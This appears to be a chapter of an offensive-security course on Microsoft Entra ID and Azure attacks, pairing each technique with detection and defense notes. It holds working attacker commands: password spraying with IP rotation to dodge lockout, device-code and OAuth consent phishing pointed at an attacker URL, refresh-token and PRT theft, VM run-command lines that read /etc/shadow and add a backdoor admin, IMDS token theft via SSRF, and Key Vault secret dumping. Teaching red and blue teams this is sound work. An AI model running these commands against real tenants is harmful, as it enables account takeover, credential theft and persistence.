---
title: "16. Azure Overview, Attacks, and AD Integration (Entra ID)"
order: 16
part: "C2 & Cloud"
description: "Entra ID vs Azure RBAC, tokens, recon, password spraying, device-code and PRT attacks, managed identity and IMDS."
---

## 16.1 Core concepts

**Microsoft Entra ID** (formerly **Azure Active Directory / Azure AD**; Microsoft renamed it in 2023) is Microsoft's cloud identity and access management service. Although it shares the same "directory" idea with on-prem AD, its protocols and attack surface are entirely different:

| Feature | On-prem AD (see Sections 13-15) | Entra ID (cloud) |
| --- | --- | --- |
| Authentication protocols | Kerberos, NTLM | OAuth2, OpenID Connect (OIDC), SAML, WS-Fed |
| Directory query | LDAP (389/636) | Microsoft Graph REST API (HTTPS 443) |
| Identity unit | Ticket (TGT/TGS), NTLM hash | JWT token (access/refresh/ID) |
| Most privileged role | Domain Admin / Enterprise Admin | Global Administrator |
| Management boundary | Domain / Forest | Tenant |
| Device membership | Domain join | Entra joined / registered / hybrid joined |

- **Tenant:** an organization's isolated Entra directory instance (users, groups, applications, policies). Each tenant has a GUID (Tenant ID) and at least one `<org>.onmicrosoft.com` default domain name; verified custom domain names (e.g. `org.com`) are also added. You can read the Tenant ID unauthenticated from `https://login.microsoftonline.com/<domain>/.well-known/openid-configuration`.
- **Entra directory roles** manage the directory (user/group/application/policy). What you need to know:

| Entra role | What it does | Attacker value |
| --- | --- | --- |
| Global Administrator | Everything; all Entra + (via toggle) all Azure RBAC | On-prem "Domain/Enterprise Admin" equivalent, the ultimate target |
| Privileged Role Administrator | Manages role assignments and PIM | Can assign Global Admin to itself → privesc bridge |
| Application Administrator | Manages all app registrations/SPs; can add credentials (secrets) | Add a secret to an app and sign in with its permissions → privesc |
| Cloud Application Administrator | Like App Administrator, but excluding app proxy | Same consent/secret abuse |
| User Administrator | Manages users/groups, resets most users' passwords | Account takeover / persistence |
| Authentication Administrator | Resets MFA methods and passwords | MFA bypass / account takeover |
| Privileged Authentication Administrator | Resets authentication for everyone, including Global Admin | Admin account takeover |

- **Azure RBAC vs Entra directory roles (OFTEN CONFUSED):** They are two separate authorization systems and do not automatically cover one another.
- **Entra directory roles** → manage directory objects (user, group, application, device). Scope: tenant.
- **Azure RBAC roles** (Owner, Contributor, Reader, User Access Administrator) → manage **Azure subscription/resource** objects (VM, Storage, Key Vault, network). Scope: management group → subscription → resource group → resource.

| Azure RBAC role | Authority |
| --- | --- |
| Owner | Full authority over the resource + can assign roles to others |
| Contributor | Creates/manages resources but cannot assign RBAC |
| Reader | Read-only |
| User Access Administrator | Cannot see resources but manages RBAC assignments (valuable for privesc) |

**Bridge:** A Global Administrator, by turning on the "Access management for Azure resources" toggle in the portal, becomes **User Access Administrator** at the root scope and can from there assign Owner to every subscription. In other words, compromising the Entra Global Admin is the gateway to indirectly compromising all Azure resources as well.

- **User / group / device:** Groups can be a security group or an M365 group; **dynamic groups** (automatic membership based on a rule), if misconfigured, let an attacker gain membership via an attribute that triggers the rule (e.g. the department field). Device membership types:

| Type | Meaning | Note |
| --- | --- | --- |
| Entra registered | A BYOD/personal device is registered to Entra, not joined | The user identity is bound to the device, the device is not managed |
| Entra joined | The device joins the cloud only (cloud-only) | The PRT is produced on this device |
| Entra hybrid joined | Domain-joined to on-prem AD + synced to Entra | Both Kerberos and PRT; the broadest attack surface |

- **App registration / Service Principal / Managed Identity / Hybrid identity (PHS, PTA, Seamless SSO, AD FS):** details in Section 17.

**Note:** The Entra role (Global Admin) manages the directory; the Azure RBAC role (Owner) manages the resource, the two are SEPARATE. The answer to "I'm Owner, can I add a user?" is no (that is an Entra job); the answer to "I'm Global Admin, can I get into the VM?" is not directly, you must first take over RBAC.

## 16.2 Authentication and tokens

Entra is built on OAuth2 and OIDC. The user authenticates at `login.microsoftonline.com`; Entra issues an **authorization code**; the client exchanges it for tokens at the token endpoint. Three kinds of token are returned:

| Token | Format | Content / purpose | Lifetime (typical) |
| --- | --- | --- | --- |
| ID token | JWT | User identity (who signed in), specific to OIDC | ~1 hour |
| Access token | JWT | Access to a specific resource (`aud`); carries permissions in `scp` (delegated scope) and `roles` (app role) | ~60-90 min |
| Refresh token | Opaque (not a JWT) | Produces new access tokens; persistence + cross-resource movement | up to 90 days (sliding with active use) |

Critical claims of the access token (JWT), decode with `jwt.ms` or `roadtx describe`:

| Claim | Meaning | Why it matters |
| --- | --- | --- |
| `aud` | Audience, the resource the token is valid for (e.g. `https://graph.microsoft.com`) | A token presented to the wrong resource is rejected |
| `scp` | Delegated permissions (e.g. `Mail.Read User.Read`) | Determines what can be done on the user's behalf |
| `roles` | Application (app-only) roles | Daemon/service permissions |
| `appid` / `azp` | The client application that requested the token | Critical for FOCI and detection |
| `tid` | Tenant ID | Which directory |

- **Refresh token persistence:** The access token is short-lived but the refresh token is long-lived, and when stolen it **silently** (without victim interaction) produces new access tokens for the attacker continuously. This is why token theft is the fundamental persistence technique that replaces "pass-the-hash" in the cloud.
- **FOCI (Family of Client IDs):** Some of Microsoft's first-party public clients (Azure CLI, Microsoft Office, Teams, Company Portal, etc.) share a common **Family Refresh Token (FRT)**. A refresh token belonging to one FOCI client can be used to obtain an access token for **another FOCI client**, that is, with a refresh token stolen from Azure CLI you can get an access token for Outlook/Graph. A 2022 study (Cobb, Larcher-Gore, Syynimaa) found 16 FOCI clients supporting FRT among 600 first-party clients. Microsoft does not publish an official/complete list. Frequently seen client IDs:

| Client | Client ID (appid) |
| --- | --- |
| Microsoft Azure CLI | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` |
| Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
| Microsoft Authentication Broker (device code / PRT flow) | `29d9ed98-a469-4536-ade2-f981bc1d605e` |
| Azure Active Directory PowerShell | `1b730954-1685-4b74-9bfd-dac224a7b894` |

- **PRT (Primary Refresh Token):** on an Entra joined/registered/hybrid joined Windows device, this is a **special and very powerful** refresh token produced by the Cloud AP provider when the user signs in for the first time. The PRT combines the **device identity + the user identity** and provides SSO (single sign-on) to all applications on that device.
- Alongside the PRT a **Session Key (SK)** is produced; to use the PRT, every request requires a cryptographic proof signed with the SK (a PRT cookie) and a **nonce** obtained from the server (replay prevention). So stealing the raw PRT alone is not enough; the SK is needed too.
- **TPM:** if the device has a TPM (Trusted Platform Module), the SK is stored inside the TPM and cannot be exported, which makes PRT theft substantially harder. On TPM-less devices the key is protected in software and can be stolen; for this reason TPM-less endpoints are especially vulnerable.
- PRT protocol versions (dirkjanm research, 2024): Windows uses PRT protocol 2.0; v3.0 introduced **deviceless** PRTs (bound only to the user, on macOS); v4.0 keeps the key in the Apple Secure Enclave. The deviceless PRT is significant from an attacker's standpoint because it can even remove the need for a fake/virtual device registration.
- The PRT is valid for 90 days by default and is renewed with active use.

**Note:** `aud` (audience) determines which resource an access token is valid for; you cannot present a token obtained for Graph to the Azure Management API, but you use the refresh token to obtain a new access token for a new `aud`. FOCI is precisely what lets you cross this boundary between clients.

## 16.3 Discovery and enumeration

### Unauthenticated (external/passive) discovery

The first step is to understand whether the target uses Entra and whether the domain is **managed** (the password is validated in the cloud) or **federated** (redirected to an external IdP such as AD FS). This determines which attack will work.

```
# getuserrealm: unauthenticated, a single HTTP request. Managed vs Federated distinction.
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&json=1"
# "NameSpaceType":"Managed"   -> password is validated in the cloud (password spray target)
# "NameSpaceType":"Federated" -> AD FS/external IdP; "AuthURL" gives the federation server
```

**AADInternals** (PowerShell, the standard tool for external discovery). Since v0.9.6 there are two modules (`AADInternals` and `AADInternals-Endpoints`):

```
Install-Module AADInternals
Import-Module AADInternals

# External recon: domains, federation status, DesktopSSO, MX/SPF/DMARC, tenant brand/ID
Invoke-AADIntReconAsOutsider -DomainName target.com | Format-Table
# (in older versions the parameter may be -Domain; verify with Get-Help)

# Single user: tenant name, authentication type, DesktopSSO info
Get-AADIntLoginInformation -UserName user@target.com
# (some versions take -Domain)

# Unauthenticated user-existence check (finding valid accounts)
Invoke-AADIntUserEnumerationAsOutsider -UserName users.txt
```

v0.9.4 (July 2024) added DoD and GCC High sub-region support to `ReconAsOutsider` and `UserEnumerationAsOutsider`.

**User enumeration / valid email detection** (without trying passwords):

```
# o365creeper (LMGsec) - getuserrealm based; old (2019, Python2, probably needs a Python3 port)
python o365creeper.py -f emails.txt -o valid.txt

# o365spray - modern alternative; enum modules: oauth2 (default), autologon, office, onedrive, rst
python3 o365spray.py --enum -U emails.txt --domain target.com
```

### Authenticated (internal) discovery: a single low-privilege token reads most of the directory

**Critical fact:** In Entra, by default **every authenticated user** can **read** the entire tenant (users, groups, roles, app registrations, devices). A single low-privilege account/token provides enormous reconnaissance. (This behavior can be partially limited with the "Restrict access to Microsoft Entra admin center" and "Guest user access restrictions" settings, but most tenants stay at the default.)

```
# Azure CLI
az login                          # interaktif; ya da --use-device-code
az account show                   # current subscription/tenant context (only SETS context, NOT Entra enum)
az account list --all             # all reachable subscriptions
az ad signed-in-user show         # who I am
az ad user list                   # all users
az ad group list                  # all groups
az ad group member list --group "Helpdesk Admins" --query "[].userPrincipalName" -o table
az ad sp list --all               # all service principals (application identities)
az ad sp owner list --id <appId>  # owners of an SP (valuable for takeover)
az role assignment list --all     # Azure RBAC assignments (privesc target)
```

**ROADtools** (dirkjanm) is a powerful set that pulls the directory into a local database and visualizes it: `roadlib` (library), `roadrecon` (collection + Angular GUI), `roadtx` (token exchange/device registration/PRT).

```
roadrecon auth -u user@target.com -p 'Password'   # get token
roadrecon gather                                   # pull entire directory to local DB (roadrecon.db)
roadrecon gui                                      # http://127.0.0.1:5000 web interface
roadrecon plugin bloodhound                        # export for import into BloodHound
```

**IMPORTANT (2025 breakage):** Microsoft began shutting off the **Azure AD Graph API** for customer applications in Q3 2025; ROADrecon's default client ID has been blocked from accessing Azure AD Graph since October 2025. For this reason **the default `roadrecon gather` may no longer work**, you must pass a different client ID or a previously obtained token.

**AzureHound → BloodHound** (SpecterOps). AzureHound CE is a Go binary; it collects Entra ID + AzureRM data via the Microsoft Graph and Azure REST API (because AzureHound uses Graph, the AAD Graph block above does not directly affect it).

```
# With username/password
azurehound -u user@target.com -p 'Password' list --tenant <tenantID> -o output.json
# Reuse the existing az CLI token (stealthier)
az account get-access-token --query accessToken -o tsv   # get token
azurehound -j <JWT> list --tenant <tenantID> -o output.json
```

The output JSON is loaded into the BloodHound CE interface (or its API); attack paths are derived from Azure "edges" (e.g. `AZGlobalAdmin`, `AZOwns`, `AZAddSecret`). BloodHound CE is updated with `bloodhound-cli update`.

**Misconfiguration / resource audit tools:**

| Tool | Language | What it does |
| --- | --- | --- |
| ScoutSuite (NCC Group) | Python (current version 5.8.x) | Multi-cloud read-only security audit; Azure/AWS/GCP misconfiguration report (HTML) |
| MicroBurst (NetSPI) | PowerShell | `Invoke-EnumerateAzureSubscriptions`, `Get-AZPasswords` (dumps Automation/Key Vault/App Service secrets), anonymous blob discovery |
| PowerZure (hausec) | PowerShell | Post-exploitation; resource enum, role/secret abuse. (maintenance may be variable) |
| Prowler | Python | CIS/benchmark-based Azure audit (ScoutSuite alternative) |

**Decision guide:** External, unauthenticated start → getuserrealm + AADInternals + o365spray. Once an identity is compromised, directory map → roadrecon/AzureHound. Azure resource misconfiguration → ScoutSuite/Prowler; secret hunting → MicroBurst.

**Detection/Defense:** AzureHound/ROADrecon collection produces a burst of heavy requests to Graph/AAD Graph from a single identity in a short time; this is visible in Entra audit/sign-in logs and in Elastic/Sentinel rules (diagnostic logging must be on). Restrict the default directory read permission (guest and member access restrictions), set critical groups to "hidden membership," and minimize service accounts' Graph permissions.

## 16.4 Common Entra attacks

### Password spraying (single factor)

Logic: Tries **one common password** against many users (1-2 attempts per account → lockout is not triggered). Targets managed domains and services where MFA is not enforced.

```
# MSOLSpray (dafthack, PowerShell)
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password 'Spring2025!' -Verbose
```

```
# MSOLSpray (MartinIngesen, Python rewrite) - IP rotation with FireProx
python3 MSOLSpray.py -u users.txt -p 'Spring2025!' -o valid.txt --url https://<id>.execute-api.us-east-1.amazonaws.com/fireprox
# -u/-p: user list/password   --url: FireProx API Gateway (source IP rotation)   -f: continue on locked accounts
```

- **FireProx** (ustayready): proxies each request with a different source IP via AWS API Gateway → helps bypass Entra **Smart Lockout** and IP-based blocks (for spraying; in brute-forcing a single account Smart Lockout still triggers).
- **MFASweep** (dafthack, PowerShell): with a single valid credential, attempts to sign in to various Microsoft services (Graph, Azure Mgmt, Exchange ActiveSync, EWS, etc.) to map **which services do not enforce MFA**. Python port: **MFADE**.

```
Import-Module .\MFASweep.ps1
Invoke-MFASweep -Username user@target.com -Password 'Spring2025!'
```

**Detection/Defense:** In Entra sign-in logs, failed sign-ins to many users with the same password (error code `50126`), distributed attempts from different IPs. Sentinel "Password spray attack against Azure AD application" rule. Defense: MFA for all users (via CA), **block legacy authentication**, Smart Lockout, passwordless authentication, banned password list.

### Device code phishing

**Why it works (protocol level):** OAuth2 **device authorization grant** (RFC 8628) is designed for keyboardless/input-less devices (TV, CLI). The attacker starts the flow **themselves**, obtains a `user_code` + `device_code` from Entra; sends the `user_code` to the victim ("IT verification: go to `microsoft.com/devicelogin` and enter this code"). The victim enters the code in their own browser and approves with **their own MFA**. Entra delivers the tokens to the **attacker** who started the flow. Because MFA was satisfied by the victim, it is **not bypassed, the attacker obtains an MFA-backed token.**

```
# TokenTacticsV2 (f-bader fork) - current cmdlet names
Import-Module .\TokenTacticsV2.psd1
Get-EntraIDTokenFromDeviceCode -Client MSGraph        # for DoD: -Client DODMSGraph
# The returned user_code is given to the victim; when the victim enters it, the token lands in $response
Invoke-RefreshToMSGraphToken -Domain target.com -refreshToken $response.refresh_token -UseCAE

# Classic TokenTactics (rvrsh3ll/rotarydrone) - old cmdlet names
Get-AzureToken -Client MSGraph                         # TokenLog.log'a yazar
Invoke-RefreshToMSGraphToken -Domain target.com -refreshToken <RT>
Invoke-RefreshToMSManageToken -Domain target.com -refreshToken <RT>   # Switch to Azure Mgmt
```

```
# GraphRunner (Black Hills) - device code token + pillaging + consent
Import-Module .\GraphRunner.ps1
Get-GraphTokens                      # starts the device code flow, sign in from a browser
Invoke-SearchMailbox -Tokens $tokens # pillage mail with the captured token
```

- **CA bypass nuance:** The device code flow with an unusual/unspecified User-Agent or client can sometimes bypass Conditional Access's device-platform/application conditions. From 2024 onward, to make this harder, Microsoft began **blocking** the device code flow **by default** (in tenants that have not used it in the last 25 days) with a Microsoft-managed CA policy.

**Detection/Defense:** In sign-in logs, `authentication_protocol = deviceCode` and the broker client ID `29d9ed98-a469-4536-ade2-f981bc1d605e`. Device code sign-ins completed with a script-based client (not a browser) are suspicious; alarm if the sign-in's IP/ASN differs from the IP where the token is used. Defense: **block the device code flow via CA** (unless required), user awareness (no one should make you enter a code), sign-in risk policies.

### Token / refresh token theft

A stolen **refresh token** is long-lived and (thanks to FOCI) is used to obtain access tokens for different resources such as Graph, Exchange, SharePoint, without requiring victim interaction or new MFA. Tokens come from memory-dumped processes, browser/application cache, files like `.roadtools_auth`/`TokenLog.log`, or device code/consent phishing.

```
# roadtx (ROADtools) - token exchange
roadtx interactiveauth -u user@target.com -p 'Password' -c msteams -r msgraph   # -c client, -r resource
roadtx gettokens -r devicereg --device-auth              # device flow if MFA requires a browser
roadtx refreshtokento -r https://outlook.office365.com/  # exchange the refresh token for another resource (FOCI)
roadtx describe < .roadtools_auth                        # decode token claims
```

ROADtx can be more flexible in some scenarios due to the legacy Azure AD Graph endpoint and its broad client impersonation capability.

**Detection/Defense:** Use of the same refresh token/session from geographically impossible locations (impossible travel), token renewal from a new/unknown client appid. Defense: **Continuous Access Evaluation (CAE)** (below), short token lifetime, token binding, forced re-authentication on a risky session, compliant device CA condition.

### PRT theft

If the PRT is stolen or produced through a fake device registration, the attacker gains device+user SSO, that is, nearly **full access** (mail, SharePoint, Azure).

```
# register a virtual device with roadtx -> obtain a PRT
roadtx device -n fakedevice -u user@target.com -p 'Password'   # register the fake device to Entra (device+session key)
roadtx prt -u user@target.com -p 'Password' --key-pem device.key --cert-pem device.pem   # get PRT (writes to roadtx.prt)
roadtx prt -a renew                                            # PRT yenile
roadtx prtauth -c msteams -r msgraph                           # get SSO token with PRT
```

- In the real world, BeyondTrust's "Evil VM" technique and Volexity cases document virtual device registration + PRT takeover. On devices that are **not TPM-backed**, the session key is in software, so the PRT (and the SK required to use it) can be stolen; on TPM-equipped devices the SK cannot be exported.
- dirkjanm's 2024 research demonstrated obtaining a **deviceless PRT**; this can skip even the device registration step and produce a PRT bound only to the user.

**Detection/Defense:** Unexpected new **device registration** events in Entra, PRT-based SSO from an unknown device. Defense: **TPM requirement** (binds session key protection to hardware), MFA requirement for device registration, compliant/hybrid-joined device CA condition, blocking of risky devices.

### Illicit consent grant (OAuth consent phishing)

"Not phishing for credentials, but **phishing for consent**." The attacker registers a harmless-looking OAuth application and sends the victim its consent screen. When the victim grants delegated permissions such as `offline_access` (refresh token), `Mail.Read`, `Mail.Send`, `Files.Read.All`, the attacker's application accesses the victim's data with a **persistent** refresh token that **does not depend on the password or MFA**. A password change does not cut off this access; only consent/token revocation does.

```
# inject a malicious OAuth app with GraphRunner (persistence)
Invoke-InjectOAuthApp -AppName "Internal Reporting" -ReplyUrl https://attacker/... -Scope "offline_access,Mail.Read,Mail.Send"
```

**Detection/Defense:** The "Consent to application" operation in the Entra **audit log**, especially new consents flagged "Risky application detected" or requesting broad delegated scopes. Defense: **restrict user consent** ("Do not allow user consent" / only low-risk permissions to verified publishers), admin consent workflow, regular OAuth application review in `Enterprise Applications`.

### Conditional Access (CA) bypass and Continuous Access Evaluation (CAE)

CA grants/blocks access or requires MFA based on sign-in conditions (user, location, device, application, risk). Typical bypass routes:

- **Legacy authentication:** IMAP, POP3, SMTP AUTH, EWS, and older Office clients **cannot support** MFA and modern device-state checks; if CA does not block them, a single factor (the stolen password) is enough to sign in. A classic weak point.
- **Device code / unusual platform-UA:** the device code flow and platform impersonation above.
- **Policies scoped only to the browser:** if CA is applied only to "browser" clients, ROPC/CLI (e.g. with the Azure CLI client_id) sign-ins bypass the policy.
- **Exclusions:** break-glass accounts, certain service principal/application-based authentications may be excluded from CA → the attacker targets these gaps.

**CAE (Continuous Access Evaluation):** Normally an access token is valid for ~1 hour, and within that time revocation (password reset, account disable, risk increase) does not take effect **immediately**. CAE relays critical events in **real time** between the resource provider (Exchange, SharePoint, Graph) and the identity provider; thus the token is revoked mid-session. CAE-capable (long-lived, up to ~28 hours) tokens can be seen in the JWT, a practical hint: if the token's `ValidForHours` value is greater than 23, it is CAE-capable. From the attacker's standpoint, CAE is the most important defense that limits a stolen token's lifetime and its use after revocation.

**Detection/Defense:** Detect gaps with CA in "report-only" mode; for legacy auth, `Client app = Other clients` in the sign-in log. Defense: block legacy auth entirely, apply CA to **all client types** (not just browser), restrict device code, clean up exclusions other than break-glass, enable CAE, make privileged roles JIT with PIM.

## 16.5 Azure resource attacks

After compromising the directory (Entra) or obtaining an identity, if there is Azure RBAC authority, you move to the **resource** layer.

### Command execution on an Azure VM

With sufficient RBAC (`Virtual Machine Contributor` and above; the required permission is `Microsoft.Compute/virtualMachines/runCommand/action`), commands are executed from the management plane without network access to the target VM. The command runs as **SYSTEM** on Windows and as **root** on Linux.

```
# Linux VM
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript \
   --scripts "id; cat /etc/shadow"
# Windows VM
az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript \
   --scripts "whoami; net user hacker P@ssw0rd! /add; net localgroup administrators hacker /add"
```

**Detection/Defense:** A "Run Command on Virtual Machine" (`Microsoft.Compute/virtualMachines/runCommand/action`) entry in the Activity Log; a Defender for Cloud alarm. Defense: restrict Contributor/VM Contributor assignments (PIM/JIT), monitor run-command on critical VMs, least privilege.

### Storage / blob / SAS leak

Misconfigured **anonymous blob containers** and leaked **SAS (Shared Access Signature) tokens** provide direct data exposure. SAS token URLs leak in logs/code/Git and are usually long-lived + broadly privileged.

```
az storage account list -o table
az storage container list --account-name <acct> --auth-mode login
az storage blob list --account-name <acct> --container-name <c> --auth-mode login -o table
# Anonymous access test (unauthenticated)
curl "https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list"
```

MicroBurst's `Invoke-EnumerateAzureBlobs` discovers anonymous containers by brute-forcing common container names.

**Detection/Defense:** Storage diagnostic logs (anonymous reads), Defender for Storage. Defense: turn off "Allow Blob anonymous access," use Entra RBAC/user-delegation SAS instead of SAS, shorten SAS lifetime, key rotation.

### RBAC abuse / privesc

Excessive/incorrect role assignments lead to escalation: `User Access Administrator` or `Owner` → make a new assignment for persistence/spread. Find over-privileged principals with `az role assignment list --all`.

```
az role assignment list --all -o table
az role assignment create --assignee <upn/appId> --role Owner --scope /subscriptions/<subId>
```

**Detection/Defense:** `Microsoft.Authorization/roleAssignments/write` in the Activity Log. Defense: JIT and approved assignment with PIM, minimize the number of Owner/UAA, regular access review.

### Managed Identity exploitation (IMDS / SSRF)

If a **Managed Identity** (system- or user-assigned) is defined on a VM or App Service, an Entra access token can be obtained from within that resource without credentials. This is most often abused via **SSRF**: if the application has an SSRF vulnerability, the attacker makes it send a request to the metadata endpoint and steals the token.

```
# IMDS (Instance Metadata Service) on VM - 169.254.169.254
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# the Metadata:true header is REQUIRED   resource = the token's audience (for Graph, https://graph.microsoft.com)
```

- **Important:** IMDS issues a token for every valid audience requested **without checking** whether the Managed Identity has permission on that resource. What the token can actually do depends on the **Azure RBAC** assigned to the MI.
- **App Service / Functions are DIFFERENT:** 169.254.169.254 is **not used**. Instead the environment variables `IDENTITY_ENDPOINT` and `IDENTITY_HEADER` are used; the request requires `X-IDENTITY-HEADER` (the platform-returned anti-SSRF secret value) and `api-version=2019-08-01`. So if a plain SSRF cannot read `IDENTITY_HEADER`, it cannot obtain a token from App Service, which makes SSRF harder than on a VM.

```
# App Service / Functions (from the code context)
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

**Detection/Defense:** MI token use from an unexpected source (e.g. a web application process), MI sign-in from an unusual IP. Defense: least-privilege RBAC for the MI, SSRF protections (block egress to IMDS at the app layer), prefer the App Service header model, Defender for Cloud MI anomaly alarms.

### Automation Account / Runbook

Azure **Automation Accounts** usually run with a broadly privileged identity (formerly the **Run As** account, typically a subscription Contributor; Microsoft retired Run As on September 30, 2023, and **Managed Identity** is now recommended). An attacker takes over this identity by writing and running a **runbook**: enumerates existing identities and Key Vaults, dumps secrets, assigns new RBAC. The way to obtain the Automation Account's encrypted credentials in cleartext is by running a runbook.

```
# inside a Runbook, get a token with the MI and pull a secret from Key Vault
Connect-AzAccount -Identity
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName <vault> -Name <secret> -AsPlainText
```

MicroBurst's `Get-AZPasswords` function automatically collects Automation Account credentials, App Service publishing profiles, and Key Vault secrets.

**Detection/Defense:** Unexpected runbook creation/execution (Activity Log `Microsoft.Automation/.../runbooks/...`), Key Vault access from the Automation Account. Defense: move from Run As to MI and make the MI least-privilege, monitor/approve runbook changes, restrict who can write to the Automation Account.

### Key Vault

Key Vault stores secrets/keys/certificates. There are two access models: the classic **access policy** and the new **Azure RBAC** (e.g. `Key Vault Secrets User`). If an identity (user, SP, or MI) gains sufficient authority, secrets are read in cleartext, these are usually the "keys to the kingdom" such as database/connection strings/API keys.

```
az keyvault list -o table
az keyvault secret list --vault-name <vault> -o table
az keyvault secret show --vault-name <vault> --name <secret> --query value -o tsv
```

**Detection/Defense:** Key Vault diagnostic logs (`SecretGet`, `VaultGet`), bulk secret reads from an unusual identity/IP; a Defender for Key Vault alarm. Defense: RBAC model + least privilege, firewall/private endpoint, secret rotation, "purge protection" and access review.

## Common mistakes (summary)

- **Entra ID vs on-prem AD:** Entra uses OAuth2/OIDC/SAML + Graph; it **does not use** Kerberos/LDAP. Think token, not ticket.
- **Device code phishing bypasses MFA** because MFA is satisfied by the victim; the token flow returns to the attacker who started it (broker client `29d9ed98-...`).
- **PRT** if stolen = device+user SSO access = nearly full access; TPM protects the session key and makes this harder, a TPM-less device is vulnerable.
- **The managed identity token is obtained over IMDS `169.254.169.254` with the `Metadata:true` header**; on App Service it is not this address but `IDENTITY_ENDPOINT` + `X-IDENTITY-HEADER` that is used.
- **Global Administrator = Entra's most privileged (directory); Azure RBAC Owner = resource level.** The two are separate; the bridge is the Global Admin escalating to User Access Administrator at the root.
- **Even a low-privilege token usually reads the entire directory** → large reconnaissance with a single account.
- **FOCI:** one FOCI client's refresh token can obtain an access token for another FOCI client → cross-resource jump.
- **Legacy auth (IMAP/POP/SMTP/EWS) cannot support MFA** → if not blocked, the easiest way to bypass CA.
- **CAE** closes the classic "token valid for 1 hour" window by enabling mid-session revocation of a stolen access token.
